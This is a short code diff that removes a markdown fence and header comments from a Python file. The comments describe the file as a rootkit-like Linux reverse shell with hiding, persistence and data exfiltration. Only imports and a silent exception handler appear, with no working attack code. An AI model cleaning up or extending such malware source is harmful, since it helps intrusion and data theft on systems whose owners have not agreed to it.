@@ -1,7 +1,3 @@
-```python
-# Advanced Rootkit-like Reverse Shell for Linux
-# Features: Extreme Hiding, Persistence, Data Exfiltration, Reverse Shell
-# WARNING: For educational/lab use only. Illegal on real systems.
 
 import os
 import subprocess
@@ -105,4 +101,3 @@ try:
 except Exception:
     pass
 
-```
